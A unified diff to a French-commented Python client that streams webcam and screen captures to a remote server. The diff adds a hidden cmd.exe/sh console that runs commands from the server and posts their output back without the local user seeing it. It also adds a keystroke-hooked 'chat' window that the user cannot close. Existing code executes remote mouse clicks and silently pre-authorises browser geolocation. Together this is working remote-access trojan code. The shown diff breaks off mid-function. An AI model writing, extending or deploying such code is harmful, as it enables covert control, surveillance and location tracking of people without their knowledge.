@@ -1,53 +1,20 @@
 """
-Client caméra / écran — se connecte au serveur par HTTP, depuis n'importe quel réseau Wi-Fi.
+Client caméra / écran / shell / chat — se connecte au serveur par HTTP,
+depuis n'importe quel réseau Wi-Fi.
 
-Compatible Windows et Linux. Gère DEUX flux indépendants envoyés au
-serveur : la caméra et l'écran. Chacun peut être démarré ou arrêté
-séparément depuis la GUI, sans affecter l'autre.
+Fonctionnalités (toutes indépendantes) :
+  - Caméra (flux vidéo)
+  - Écran (capture d'écran, avec replis Wayland : portail xdg, gnome-screenshot, grim)
+  - Souris (position remontée, clics exécutés localement)
+  - Localisation (navigateur Chrome/Edge en mode --app, pré-autorisé géoloc)
+  - CMD Commandes : console cmd.exe PERSISTANTE, SANS FENÊTRE, dont
+    stdout/stderr sont redirigés vers server_gui (comme les frames caméra).
+    L'utilisateur du client ne la voit pas. Seul server_gui y écrit.
+  - Chat : vraie console cmd.exe VISIBLE chez le client, avec capture des
+    frappes via hook clavier (Solution B — préfixe invisible). Le [X] est
+    neutralisé ; seul server_gui peut fermer la console.
 
-Capture d'écran : sous Linux en session Wayland, mss ne voit que la
-couche de compatibilité XWayland et renvoie une image noire. Ce client
-teste, dès le démarrage de la capture, chaque méthode disponible avec
-une VRAIE capture d'essai, dont le CONTENU est vérifié (pas seulement
-qu'une image se décode, mais qu'elle n'est pas uniformément noire), et
-garde, dans cet ordre, celles qui réussissent : xdg-desktop-portal
-(org.freedesktop.portal.Desktop — l'API moderne commune à GNOME, KDE et
-la plupart des environnements récents), gnome-screenshot, grim
-(compositeurs wlroots : Sway, Hyprland...), puis mss en dernier recours.
-Si la méthode en cours échoue, la suivante est utilisée automatiquement.
-L'ancienne API privée org.gnome.Shell.Screenshot est volontairement
-abandonnée : elle est restreinte sur les versions récentes de GNOME.
-Le portail est appelé via « jeepney » (pip install jeepney) quand il est
-installé : la réponse du portail arrive par un signal D-Bus qui doit être
-reçu par la MÊME connexion que celle qui a fait l'appel ; sans jeepney, on
-se rabat sur les outils en ligne de commande (gdbus).
-
-La capture d'écran tourne dans un thread dédié, séparé de celui qui
-envoie au serveur : sans ce découplage, chaque image attendait la fin
-de la requête HTTP précédente avant que la suivante soit capturée, ce
-qui donnait une capture « une image à la fois » dès que le réseau
-n'était pas instantané. Le thread d'envoi poste toujours la DERNIÈRE
-image capturée (jamais de file d'attente qui prendrait du retard).
-
-Chaque client possède un identifiant unique (device_id), généré à la
-première exécution et mémorisé dans la configuration.
-
-Contrôle souris : quand le flux écran est actif, la position de la souris
-est envoyée périodiquement au serveur (pour que la GUI affiche un curseur
-sur l'image) et les clics demandés par la GUI sont exécutés localement.
-Un clic est précédé de l'ACTIVATION de la fenêtre sous le curseur (sinon
-le clic peut être ignoré par l'OS) et séparé par un délai down/up (sinon
-les clics instantanés sont filtrés par Windows et la plupart des
-gestionnaires de fenêtres Linux).
-
-Utilisation :
-    python client.py --server https://mon-serveur.com --save   # première fois
-    python client.py                                           # ensuite (relit la config)
-    python client.py --once --debug                             # test : un seul cycle, logs détaillés
-
-Ordre de priorité pour l'URL du serveur : --server, puis la configuration
-mémorisée (--save), puis l'URL intégrée au build (embedded_config.py, utilisée
-par l'installateur Windows), puis la valeur par défaut locale.
+Compatible Windows et Linux (le chat n'est actif que sous Windows).
 """
 
 import argparse
@@ -55,6 +22,7 @@ import json
 import logging
 import os
 import platform
+import queue
 import re
 import select
 import shutil
@@ -71,6 +39,7 @@ from urllib.parse import unquote, urlparse
 import cv2
 import numpy as np
 import requests
+
 try:
     from mss import MSS as _MSS   # versions récentes de mss
 except ImportError:
@@ -89,6 +58,14 @@ try:
 except ImportError:
     EMBEDDED_SERVER_URL = ""
 
+try:
+    from console_windows import ChatConsole
+    _HAS_CHAT_CONSOLE = platform.system() == "Windows"
+except ImportError:
+    ChatConsole = None
+    _HAS_CHAT_CONSOLE = False
+
+
 DEFAULT_SERVER_URL = "http://127.0.0.1:5050"
 POLL_INTERVAL = 1.0           # secondes entre deux vérifications de commandes
 CAMERA_FRAME_INTERVAL = 0.05  # intervalle MINIMUM entre deux envois caméra (~20 im/s max)
@@ -96,11 +73,7 @@ CAMERA_WIDTH = 640
 CAMERA_HEIGHT = 480
 CAMERA_JPEG_QUALITY = 65
 SCREEN_JPEG_QUALITY = 55
-SCREEN_MAX_WIDTH = 1024        # l'écran est réduit avant envoi : un 1080p plein format pèse 4 à 6x plus lourd
-# Intervalle MINIMUM entre deux captures, par méthode (la capture et l'envoi
-# réseau tournent dans deux threads séparés, donc ceci ne dépend plus du
-# réseau : mss est quasi instantané, le portail xdg passe par un aller-retour
-# D-Bus, gnome-screenshot et grim relancent un processus à chaque image.
+SCREEN_MAX_WIDTH = 1024
 SCREEN_CAPTURE_MIN_INTERVAL = {
     "mss": 0.05,
     "xdg-portal": 0.15,
@@ -108,18 +81,20 @@ SCREEN_CAPTURE_MIN_INTERVAL = {
     "gnome-screenshot": 0.4,
 }
 SCREEN_CAPTURE_MIN_INTERVAL_DEFAULT = 0.2
-# Envois PARALLÈLES : un seul envoi à la fois limitait le débit à 1 image par
-# aller-retour réseau (RTT). Avec 2 envois simultanés, on en émet ~2x plus
-# par seconde sans plus de retard (le serveur ignore les images arrivées en retard).
 CAMERA_SEND_WORKERS = 2
 SCREEN_SEND_WORKERS = 2
 SCREEN_SEND_MIN_INTERVAL = 0.0
 REQUEST_TIMEOUT = 5
 CAPTURE_SUBPROCESS_TIMEOUT = 5
-MIN_VALID_FRAME_STD = 2.0      # en dessous : image considérée comme quasi noire/uniforme
-SCREEN_FAILURE_FALLBACK_THRESHOLD = 10  # échecs consécutifs avant de basculer sur mss en cours de route
+MIN_VALID_FRAME_STD = 2.0
+SCREEN_FAILURE_FALLBACK_THRESHOLD = 10
 SCREEN_FAILURE_WARN_AT = 5
-MOUSE_SEND_INTERVAL = 0.1      # ~10 Hz : suffisant pour un curseur fluide côté GUI
+MOUSE_SEND_INTERVAL = 0.1
+
+# Shell / chat
+SHELL_STREAM_MIN_INTERVAL = 0.05   # ~20 envois/s max pour le flux console
+SHELL_STREAM_CHUNK = 4096
+SHELL_STREAM_BUFFER_MAX = 16384    # taille max d'un chunk envoyé au serveur
 
 
 # ---------------------------------------------------------------------
@@ -213,11 +188,11 @@ def _open_camera() -> cv2.VideoCapture:
     else:
         capture = cv2.VideoCapture(0)
     if capture.isOpened():
-        capture.set(cv2.CAP_PROP_BUFFERSIZE, 1)   # pas de file d'images périmées dans le driver
+        capture.set(cv2.CAP_PROP_BUFFERSIZE, 1)
         capture.set(cv2.CAP_PROP_FOURCC, cv2.VideoWriter_fourcc(*"MJPG"))
         capture.set(cv2.CAP_PROP_FRAME_WIDTH, CAMERA_WIDTH)
         capture.set(cv2.CAP_PROP_FRAME_HEIGHT, CAMERA_HEIGHT)
-        capture.set(cv2.CAP_PROP_FPS, 30)   # sans ça, certaines webcams Windows tombent à 5-15 im/s en lumière faible
+        capture.set(cv2.CAP_PROP_FPS, 30)
     return capture
 
 
@@ -225,12 +200,6 @@ def _open_camera() -> cv2.VideoCapture:
 # Navigateur de localisation (ouvert/fermé à la demande du server-gui)
 # ---------------------------------------------------------------------
 
-# Navigateurs capables du mode "--app" (fenêtre SANS barre d'adresse, lancée
-# comme un process à part). C'est volontairement PAS webbrowser.open() :
-# cette fonction ne donne aucune prise sur la fenêtre ouverte, alors que
-# subprocess.Popen() renvoie un processus qu'on peut TERMINER à la demande
-# (bouton "Fermer navigateur" du server-gui). C'est tout l'enjeu : pouvoir
-# fermer à distance, pas seulement ouvrir.
 LOCATION_BROWSER_CANDIDATES_LINUX = (
     "google-chrome", "google-chrome-stable", "chromium", "chromium-browser",
     "microsoft-edge", "microsoft-edge-stable",
@@ -257,13 +226,7 @@ def _grant_geolocation_permission(profile_dir: Path, server_url: str) -> None:
     """Pré-autorise la géolocalisation pour l'origine DU SERVEUR dans le
     fichier Preferences du profil Chrome/Edge dédié à cette fenêtre, AVANT
     de l'ouvrir. Résultat : le popup natif d'autorisation n'apparaît plus
-    jamais, pas même une première fois — contrairement à un simple profil
-    persistant qui demanderait l'autorisation une fois puis s'en souviendrait.
-
-    Format "profile.content_settings.exceptions.geolocation" : c'est le
-    même mécanisme que Chrome utilise lui-même pour retenir un choix de
-    l'utilisateur (setting=1 -> CONTENT_SETTING_ALLOW), on l'écrit juste
-    nous-mêmes à l'avance."""
+    jamais, pas même une première fois."""
     default_dir = profile_dir / "Default"
     default_dir.mkdir(parents=True, exist_ok=True)
     prefs_path = default_dir / "Preferences"
@@ -292,9 +255,7 @@ def _grant_geolocation_permission(profile_dir: Path, server_url: str) -> None:
 
 def _find_app_mode_browser() -> "str | None":
     """Cherche un navigateur Chromium (Chrome/Edge/Chromium) capable du mode
-    --app. Si aucun n'est trouvé, l'appelant se rabat sur webbrowser.open()
-    (le navigateur par défaut s'ouvre, mais ne pourra pas être fermé à
-    distance depuis le server-gui — seulement ouvert)."""
+    --app. Si aucun n'est trouvé, l'appelant se rabat sur webbrowser.open()."""
     if platform.system() == "Windows":
         for path in LOCATION_BROWSER_CANDIDATES_WINDOWS:
             if os.path.exists(path):
@@ -324,9 +285,7 @@ def _frame_looks_valid(frame) -> bool:
 
 
 def _grab_screen_grim() -> "np.ndarray | None":
-    """Capture via grim (compositeurs wlroots : Sway, Hyprland...) — ne
-    fonctionne pas sur GNOME/Mutter (peut y renvoyer une image noire sans
-    lever d'erreur, d'où la vérification de contenu dans _frame_looks_valid)."""
+    """Capture via grim (compositeurs wlroots : Sway, Hyprland...)."""
     result = subprocess.run(
         ["grim", "-"], capture_output=True, timeout=CAPTURE_SUBPROCESS_TIMEOUT, check=True
     )
@@ -356,9 +315,8 @@ def _grab_screen_gnome_screenshot() -> "np.ndarray | None":
 
 def _read_portal_screenshot(uri: str) -> "np.ndarray | None":
     """Lit (puis supprime) le fichier désigné par l'URI renvoyée par le portail.
-    L'URI est encodée en pourcentage : GNOME nomme ses captures « Screenshot from
-    2026-11-05 10-20-33.png », donc l'URI contient %20 — sans décodage,
-    cv2.imread ne trouve pas le fichier et renvoie None à chaque image."""
+    L'URI est encodée en pourcentage : sans décodage, cv2.imread ne trouve
+    pas le fichier et renvoie None à chaque image."""
     path = unquote(urlparse(uri).path)
     image = cv2.imread(path)
     try:
@@ -416,13 +374,9 @@ def _grab_screen_xdg_portal() -> "np.ndarray | None":
 
 
 def _grab_screen_xdg_portal_gdbus() -> "np.ndarray | None":
-    """Capture via xdg-desktop-portal (org.freedesktop.portal.Desktop),
-    l'API moderne commune à GNOME, KDE et la plupart des environnements
-    récents — elle remplace les API privées de chaque compositeur (comme
-    org.gnome.Shell.Screenshot, désormais restreinte sur les versions
-    récentes de GNOME). L'appel est asynchrone : il renvoie d'abord un
-    "handle" (ticket), et le résultat réel (l'URI du fichier) arrive
-    ensuite via un signal "Response" séparé, qu'il faut écouter."""
+    """Capture via xdg-desktop-portal. L'appel est asynchrone : il renvoie
+    d'abord un "handle" (ticket), et le résultat réel (l'URI du fichier)
+    arrive ensuite via un signal "Response" séparé, qu'il faut écouter."""
     monitor = subprocess.Popen(
         ["gdbus", "monitor", "--session", "--dest", "org.freedesktop.portal.Desktop"],
         stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True,
@@ -487,13 +441,10 @@ def _portal_available() -> bool:
 
 def _screen_capture_candidates() -> list:
     """Retourne les méthodes de capture à essayer, par ordre de préférence.
-
-    Sous Wayland, chacune est testée avec une VRAIE capture dont le CONTENU est
-    vérifié (pas seulement qu'une image se décode, mais qu'elle n'est pas
-    uniformément noire) : seules celles qui réussissent sont gardées. « mss »
-    est toujours en dernier, pour ne jamais bloquer le démarrage."""
+    Sous Wayland, chacune est testée avec une VRAIE capture dont le CONTENU
+    est vérifié. « mss » est toujours en dernier."""
     if platform.system() != "Linux" or _detect_linux_session_type() != "wayland":
-        return ["mss"]  # Windows/macOS, ou X11 classique : mss fonctionne normalement
+        return ["mss"]
 
     testers = {}
     if _portal_available():
@@ -518,18 +469,17 @@ def _screen_capture_candidates() -> list:
 
     if not working:
         logger.error(
-            "Session Wayland : AUCUNE méthode de capture n'a fonctionné (portail, gnome-screenshot, grim). "
-            "mss ne verra que XWayland et enverra une image NOIRE. Solutions : "
-            "(1) sudo apt install gnome-screenshot ; (2) pip install jeepney dans le venv du client ; "
-            "(3) ouvrir une session « GNOME on Xorg » depuis l'écran de connexion."
+            "Session Wayland : AUCUNE méthode de capture n'a fonctionné. "
+            "Solutions : (1) sudo apt install gnome-screenshot ; "
+            "(2) pip install jeepney ; (3) session « GNOME on Xorg »."
         )
     return working + ["mss"]
 
 
 class _LatestFrame:
     """Case partagée qui ne garde que la DERNIÈRE image. Les threads d'envoi
-    sont réveillés INSTANTANÉMENT à l'arrivée d'une image (plus de pause
-    fixe de 20 ms) et chaque image n'est prise que par UN seul thread."""
+    sont réveillés INSTANTANÉMENT à l'arrivée d'une image et chaque image
+    n'est prise que par UN seul thread."""
 
     def __init__(self):
         self._cond = threading.Condition()
@@ -562,13 +512,161 @@ class _RateLimiter:
         self._next = 0.0
 
     def reserve(self) -> float:
-        """Réserve le prochain créneau et renvoie le délai à attendre avant de l'utiliser."""
         with self._lock:
             now = time.monotonic()
             slot = max(now, self._next)
             self._next = slot + self._interval
             return slot - now
 
+
+# ---------------------------------------------------------------------
+# Console distante (CMD Commandes) — cmd.exe persistant, sans fenêtre,
+# stdout/stderr redirigés vers le serveur.
+# ---------------------------------------------------------------------
+
+class RemoteConsole:
+    """cmd.exe persistant, sans fenêtre, avec pipes stdin/stdout/stderr.
+    La sortie est envoyée au serveur comme les frames caméra ; les
+    commandes viennent de server_gui. Aucune fenêtre visible côté client."""
+
+    def __init__(self, server_url: str, device_id: str):
+        self.server_url = server_url
+        self.device_id = device_id
+        self.process: subprocess.Popen | None = None
+        self._stop = threading.Event()
+        self._threads: list[threading.Thread] = []
+        self._write_lock = threading.Lock()
+        self._send_queue: "queue.Queue[str]" = queue.Queue(maxsize=200)
+
+    def start(self) -> bool:
+        if self.process is not None and self.process.poll() is None:
+            return True
+        if platform.system() == "Windows":
+            creationflags = subprocess.CREATE_NO_WINDOW
+            argv = ["cmd.exe"]
+        else:
+            creationflags = 0
+            argv = ["/bin/sh", "-i"]
+
+        try:
+            self.process = subprocess.Popen(
+                argv,
+                stdin=subprocess.PIPE,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                creationflags=creationflags,
+                bufsize=0,
+            )
+        except Exception as exc:
+            logger.error("Impossible de lancer la console distante : %s", exc)
+            return False
+
+        self._stop.clear()
+        self._threads = [
+            threading.Thread(target=self._reader_loop, daemon=True),
+            threading.Thread(target=self._sender_loop, daemon=True),
+        ]
+        for t in self._threads:
+            t.start()
+        logger.info("Console distante démarrée (PID %s)", self.process.pid)
+        return True
+
+    def stop(self) -> None:
+        self._stop.set()
+        proc = self.process
+        self.process = None
+        if proc is not None and proc.poll() is None:
+            try:
+                if proc.stdin:
+                    proc.stdin.write(b"exit\r\n")
+                    proc.stdin.flush()
+            except Exception:
+                pass
+            try:
+                proc.wait(timeout=3)
+            except subprocess.TimeoutExpired:
+                proc.terminate()
+        for t in self._threads:
+            t.join(timeout=2)
+        self._threads = []
+
+    def is_running(self) -> bool:
+        return self.process is not None and self.process.poll() is None
+
+    def write_command(self, command: str) -> None:
+        if not self.is_running():
+            return
+        try:
+            with self._write_lock:
+                self.process.stdin.write((command + "\r\n").encode("utf-8", errors="replace"))
+                self.process.stdin.flush()
+        except Exception as exc:
+            logger.warning("Écriture console impossible : %s", exc)
+
+    def _reader_loop(self) -> None:
+        assert self.process is not None and self.process.stdout is not None
+        stream = self.process.stdout
+        while not self._stop.is_set():
+            try:
+                chunk = stream.read(1)
+            except Exception:
+                break
+            if not chunk:
+                break
+            data = bytearray(chunk)
+            try:
+                fd = stream.fileno()
+                while len(data) < SHELL_STREAM_CHUNK:
+                    more = os.read(fd, SHELL_STREAM_CHUNK - len(data))
+                    if not more:
+                        break
+                    data.extend(more)
+                    if len(more) < 64:
+                        break
+            except (BlockingIOError, OSError):
+                pass
+            text = bytes(data).decode("utf-8", errors="replace")
+            try:
+                self._send_queue.put_nowait(text)
+            except queue.Full:
+                pass
+
+    def _sender_loop(self) -> None:
+        session = requests.Session()
+        last_send = 0.0
+        pending = ""
+        while not self._stop.is_set():
+            try:
+                chunk = self._send_queue.get(timeout=0.2)
+                pending += chunk
+            except queue.Empty:
+                pass
+            now = time.monotonic()
+            if pending and (now - last_send) >= SHELL_STREAM_MIN_INTERVAL:
+                try:
+                    session.post(
+                        f"{self.server_url}/api/shell/output",
+                        json={"device_id": self.device_id, "chunk": pending[-SHELL_STREAM_BUFFER_MAX:]},
+                        timeout=5,
+                    )
+                    pending = ""
+                    last_send = now
+                except requests.RequestException:
+                    pass
+        if pending:
+            try:
+                session.post(
+                    f"{self.server_url}/api/shell/output",
+                    json={"device_id": self.device_id, "chunk": pending},
+                    timeout=5,
+                )
+            except requests.RequestException:
+                pass
+
+
+# ---------------------------------------------------------------------
+# Client principal
+# ---------------------------------------------------------------------
 
 class CameraClient:
     def __init__(self, server_url: str, device_id: str, device_name: str):
@@ -583,8 +681,7 @@ class CameraClient:
         self._camera_capture_thread: threading.Thread | None = None
         self._camera_slot = _LatestFrame()
         # Session HTTP persistante (keep-alive) pour les commandes ; chaque
-        # thread d'envoi d'images a la sienne (voir _sender_worker). Sans
-        # elles, CHAQUE image ouvre une nouvelle connexion TCP (+ TLS en https).
+        # thread d'envoi d'images a la sienne (voir _sender_worker).
         self._cmd_session = requests.Session()
         self._stop_screen_event = threading.Event()
         self._screen_slot = _LatestFrame()
@@ -598,8 +695,20 @@ class CameraClient:
         self._mouse_thread: threading.Thread | None = None
         self._stop_mouse_event = threading.Event()
         self._mouse_controller = _MouseController() if _HAS_PYNPUT else None
-        self._screen_size: tuple[int, int] | None = None   # (w, h) écran source, pour la GUI
+        self._screen_size: tuple[int, int] | None = None
 
+        # CMD Commandes : console persistante sans fenêtre
+        self._remote_console = RemoteConsole(server_url, device_id)
+
+        # Chat : vraie console visible (Windows uniquement)
+        self._chat_console: "ChatConsole | None" = None
+        if _HAS_CHAT_CONSOLE:
+            self._chat_console = ChatConsole(
+                title="Chat — ne pas fermer",
+                on_user_input=self._handle_user_chat,
+            )
+
+    # ------------------------------------------------------------------
     def run_forever(self) -> None:
         logger.info(
             "Démarrage du client — serveur : %s — appareil : %s (%s)",
@@ -615,11 +724,14 @@ class CameraClient:
     def run_once(self) -> None:
         logger.info("Test (--once) — serveur : %s — appareil : %s", self.server_url, self.device_id)
         self._check_commands()
-        time.sleep(1)  # laisse une chance aux flux de démarrer avant de couper
+        time.sleep(1)
         if self.camera_on:
             self._stop_camera()
         if self.screen_on:
             self._stop_screen()
+        self._remote_console.stop()
+        if self._chat_console is not None:
+            self._chat_console.close()
 
     def _check_commands(self) -> None:
         # Si l'UTILISATEUR a fermé lui-même la fenêtre du navigateur de
@@ -635,6 +747,8 @@ class CameraClient:
                 "device_id": self.device_id,
                 "name": self.device_name,
                 "location_open": "1" if self.location_open else "0",
+                "chat_window_open": "1" if self._chat_window_is_open() else "0",
+                "cmd_console_open": "1" if self._remote_console.is_running() else "0",
             },
             timeout=REQUEST_TIMEOUT,
         )
@@ -662,12 +776,69 @@ class CameraClient:
 
         mouse_click = commands.get("mouse_click")
         if mouse_click:
-            # Le serveur renvoie UN clic à la fois (file consommée) : ainsi
-            # plusieurs clics rapprochés ne se perdent pas entre deux polls.
             try:
                 self._click_mouse(int(mouse_click["x"]), int(mouse_click["y"]))
             except (KeyError, TypeError, ValueError) as exc:
                 logger.warning("Commande de clic invalide : %s (%s)", mouse_click, exc)
+
+        # CMD Commandes : ouverture/fermeture de la console persistante
+        console_cmd = commands.get("cmd_console")
+        if console_cmd == "OPEN" and not self._remote_console.is_running():
+            self._remote_console.start()
+        elif console_cmd == "CLOSE" and self._remote_console.is_running():
+            self._remote_console.stop()
+
+        # Une commande à écrire dans stdin du cmd.exe persistant
+        shell_input = commands.get("shell_input")
+        if shell_input and self._remote_console.is_running():
+            self._remote_console.write_command(shell_input.get("text", ""))
+
+        # Chat : message de la GUI -> console visible du client
+        chat_msg = commands.get("chat_message")
+        if chat_msg and self._chat_console is not None and self._chat_console.is_open():
+            self._chat_console.show_incoming(chat_msg.get("message", ""))
+
+        # Chat : ouverture/fermeture de la console visible (GUI seule décide)
+        chat_window_cmd = commands.get("chat_window")
+        if self._chat_console is not None:
+            if chat_window_cmd == "OPEN" and not self._chat_console.is_open():
+                self._chat_console.open()
+            elif chat_window_cmd == "CLOSE" and self._chat_console.is_open():
+                self._chat_console.close()
+
+    # ------------------------------------------------------------------
+    # Chat : appelée par le hook clavier quand l'utilisateur tape
+    # ------------------------------------------------------------------
+    def _handle_user_chat(self, line: str) -> None:
+        """L'utilisateur a tapé un message dans la console chat. On l'envoie
+        au serveur, puis on injecte localement 'echo Toi: <line>' pour
+        l'afficher (Solution B — préfixe invisible)."""
+        try:
+            requests.post(
+                f"{self.server_url}/api/shell/result",
+                json={
+                    "device_id": self.device_id,
+                    "type": "chat",
+                    "message": line[:4000],
+                },
+                timeout=REQUEST_TIMEOUT,
+            )
+        except requests.RequestException:
+            pass
+        # Affichage local : "echo Toi: <line>"
+        if self._chat_console is not None and self._chat_console.is_open():
+            safe = (
+                line.replace("^", "^^")
+                .replace("&", "^&")
+                .replace("|", "^|")
+                .replace("<", "^<")
+                .replace(">", "^>")
+                .replace('"', "'")
+            )
+            self._chat_console._send_text(f"echo Toi: {safe}\r")
+
+    def _chat_window_is_open(self) -> bool:
+        return self._chat_console is not None and self._chat_console.is_open()
 
     # ------------------------------------------------------------------
     # Flux caméra
@@ -681,7 +852,7 @@ class CameraClient:
 
         self.camera_on = True
         self._camera_slot = slot = _LatestFrame()
-        self._stop_camera_event = threading.Event()   # nouveau à chaque démarrage
+        self._stop_camera_event = threading.Event()
         self._camera_capture_thread = threading.Thread(
             target=self._camera_capture_loop, args=(self.capture, self._stop_camera_event, slot), daemon=True
         )
@@ -694,7 +865,7 @@ class CameraClient:
         self._stop_camera_event.set()
         thread = self._camera_capture_thread
         if thread is not None:
-            thread.join(timeout=2)      # laisse le thread finir son read() avant de libérer la caméra
+            thread.join(timeout=2)
             self._camera_capture_thread = None
         if self.capture is not None:
             self.capture.release()
@@ -702,9 +873,7 @@ class CameraClient:
         logger.info("Caméra éteinte")
 
     def _camera_capture_loop(self, capture: cv2.VideoCapture, stop_event: threading.Event, slot: _LatestFrame) -> None:
-        """Lit la caméra EN CONTINU, sans jamais attendre le réseau : le driver
-        ne peut donc plus accumuler d'images périmées (cause n°1 de la latence).
-        Seule la dernière image est conservée pour le thread d'envoi."""
+        """Lit la caméra EN CONTINU, sans jamais attendre le réseau."""
         failures = 0
         while not stop_event.is_set():
             ok, frame = capture.read()
@@ -725,14 +894,13 @@ class CameraClient:
 
     def _sender_worker(self, stream: str, slot: _LatestFrame, stop_event: threading.Event,
                        rate: _RateLimiter) -> None:
-        """Poste toujours la DERNIÈRE image disponible, sans pause inutile.
-        Plusieurs de ces threads tournent en parallèle par flux."""
-        session = requests.Session()   # une session (donc une connexion keep-alive) par thread
+        """Poste toujours la DERNIÈRE image disponible, sans pause inutile."""
+        session = requests.Session()
         while not stop_event.is_set():
             delay = rate.reserve()
             if delay > 0 and stop_event.wait(delay):
                 break
-            frame = slot.claim(stop_event)   # prise APRÈS l'attente : c'est l'image la plus fraîche
+            frame = slot.claim(stop_event)
             if frame is None:
                 continue
             self._send_frame(frame, stream, session, time.time_ns() // 1000)
@@ -742,9 +910,9 @@ class CameraClient:
     # ------------------------------------------------------------------
     def _start_screen(self) -> None:
         self.screen_on = True
-        self._stop_screen_event = threading.Event()   # nouveau à chaque démarrage
+        self._stop_screen_event = threading.Event()
         self._screen_slot = slot = _LatestFrame()
-        self._screen_size = None   # sera fixée à la première capture
+        self._screen_size = None
         threading.Thread(
             target=self._capture_screen_loop, args=(self._stop_screen_event, slot), daemon=True
         ).start()
@@ -759,9 +927,7 @@ class CameraClient:
         logger.info("Capture d'écran arrêtée")
 
     def _capture_screen_loop(self, stop_event: threading.Event, slot: _LatestFrame) -> None:
-        """Capture en continu, SANS jamais attendre le réseau : écrit juste la
-        dernière image dans une case partagée, que le thread d'envoi lira à
-        son propre rythme."""
+        """Capture en continu, SANS jamais attendre le réseau."""
         candidates = _screen_capture_candidates()
         mode_index = 0
         mode = candidates[mode_index]
@@ -813,9 +979,6 @@ class CameraClient:
                     )
                     sent_first_frame = True
 
-                # Taille écran SOURCE mémorisée une seule fois : elle sert au
-                # serveur/GUI à convertir un clic sur l'image réduite en
-                # coordonnées écran réelles.
                 if self._screen_size is None:
                     self._screen_size = (frame.shape[1], frame.shape[0])
 
@@ -854,9 +1017,6 @@ class CameraClient:
     # Souris : position envoyée, clics exécutés localement
     # ------------------------------------------------------------------
     def _start_mouse_tracking(self) -> None:
-        """Démarre l'envoi périodique de la position de la souris. Le thread
-        tourne tant que le flux écran est actif : les coordonnées n'ont de
-        sens que par rapport à la capture d'écran."""
         if self._mouse_thread is not None and self._mouse_thread.is_alive():
             return
         self._stop_mouse_event = threading.Event()
@@ -879,7 +1039,6 @@ class CameraClient:
                 return tuple(self._mouse_controller.position)
             except Exception:
                 return None
-        # Repli sans pynput : ctypes sous Windows, xdotool sous Linux (X11).
         try:
             if platform.system() == "Windows":
                 import ctypes
@@ -897,11 +1056,7 @@ class CameraClient:
             return None
 
     def _mouse_tracking_loop(self, stop_event: threading.Event) -> None:
-        """Envoie la position souris au serveur, à intervalle fixe. Les
-        coordonnées sont accompagnées de la taille de l'écran source, que le
-        serveur transmet ensuite à la GUI : ainsi la GUI peut convertir un
-        clic sur l'image réduite en coordonnées écran réelles."""
-        session = requests.Session()   # keep-alive dédié, comme les threads d'images
+        session = requests.Session()
         while not stop_event.is_set():
             position = self._get_mouse_position()
             if position is not None:
@@ -914,18 +1069,11 @@ class CameraClient:
                         f"{self.server_url}/api/mouse/move", json=payload, timeout=REQUEST_TIMEOUT,
                     )
                 except requests.RequestException:
-                    pass   # on retentera au prochain tick
+                    pass
             stop_event.wait(MOUSE_SEND_INTERVAL)
 
     def _activate_window_at(self, x: int, y: int) -> None:
-        """Active la fenêtre située sous (x, y) AVANT le clic. Sans ça, le
-        clic peut être envoyé à la mauvaise fenêtre (celle qui a le focus)
-        ou ignoré par l'OS : c'est la cause n°1 des clics « qui ne font rien ».
-
-        Windows : WindowFromPoint + SetForegroundWindow.
-        Linux X11 : xdotool windowactivate sur la fenêtre sous le curseur.
-        Wayland : non supporté (les fenêtres Wayland natives refusent les
-        activations synthétiques — limite du protocole)."""
+        """Active la fenêtre située sous (x, y) AVANT le clic."""
         try:
             if platform.system() == "Windows":
                 import ctypes
@@ -934,13 +1082,11 @@ class CameraClient:
                 point = ctypes.wintypes.POINT(int(x), int(y))
                 hwnd = user32.WindowFromPoint(point)
                 if hwnd:
-                    # Restaure la fenêtre si elle est minimisée, puis l'active.
                     if user32.IsIconic(hwnd):
-                        user32.ShowWindow(hwnd, 9)  # SW_RESTORE
+                        user32.ShowWindow(hwnd, 9)
                     user32.SetForegroundWindow(hwnd)
-                    time.sleep(0.05)   # laisse Windows traiter l'activation
+                    time.sleep(0.05)
                 return
-            # Linux X11 : xdotool windowactivate sur la fenêtre sous le curseur.
             result = subprocess.run(
                 ["xdotool", "mousemove", str(int(x)), str(int(y)), "getmouselocation", "--shell"],
                 capture_output=True, timeout=1, text=True, check=False,
@@ -956,22 +1102,16 @@ class CameraClient:
                 )
                 time.sleep(0.05)
         except Exception:
-            # L'activation est un « bonus » : si elle échoue, on tente quand
-            # même le clic (parfois ça suffit, notamment sur un bureau vide).
             pass
 
     def _click_mouse_ctypes(self, x: int, y: int) -> bool:
-        """Clic Windows via ctypes (repli de pynput). Retourne True si le clic
-        a été envoyé, False sinon. Le délai down→up est ESSENTIEL : sans lui,
-        Windows rate le clic (down et up dans la même milliseconde)."""
         try:
             import ctypes
             user32 = ctypes.windll.user32
             user32.SetCursorPos(int(x), int(y))
-            time.sleep(0.02)   # laisse le curseur bouger
-            # MOUSEEVENTF_LEFTDOWN = 0x0002, MOUSEEVENTF_LEFTUP = 0x0004
+            time.sleep(0.02)
             user32.mouse_event(0x0002, 0, 0, 0, 0)
-            time.sleep(0.05)   # délai critique : down puis up séparés
+            time.sleep(0.05)
             user32.mouse_event(0x0004, 0, 0, 0, 0)
             return True
         except Exception as exc:
@@ -979,34 +1119,21 @@ class CameraClient:
             return False
 
     def _click_mouse(self, x: int, y: int) -> None:
-        """Déplace la souris puis clique (bouton gauche) aux coordonnées
-        demandées.
-
-        Ordre des tentatives (du plus fiable au plus rustique) :
-          1. Active la fenêtre sous le curseur (sinon le clic peut être ignoré).
-          2. pynput : déplace, attend 20 ms, press, attend 50 ms, release.
-             Le délai down→up est ESSENTIEL : un clic instantané est raté par
-             Windows et par la plupart des gestionnaires de fenêtres Linux.
-          3. Si pynput échoue OU n'est pas installé : ctypes (Windows) /
-             xdotool (Linux X11), avec les mêmes délais.
-        """
-        # 1. Activer la fenêtre sous le curseur (best-effort).
+        """Déplace la souris puis clique (bouton gauche) aux coordonnées demandées."""
         self._activate_window_at(x, y)
 
-        # 2. pynput (méthode principale).
         if self._mouse_controller is not None:
             try:
                 self._mouse_controller.position = (int(x), int(y))
-                time.sleep(0.02)                              # mousemove traité
+                time.sleep(0.02)
                 self._mouse_controller.press(Button.left)
-                time.sleep(0.05)                              # down→up : clic réel
+                time.sleep(0.05)
                 self._mouse_controller.release(Button.left)
                 logger.info("Clic exécuté (pynput) : (%s, %s)", x, y)
                 return
             except Exception as exc:
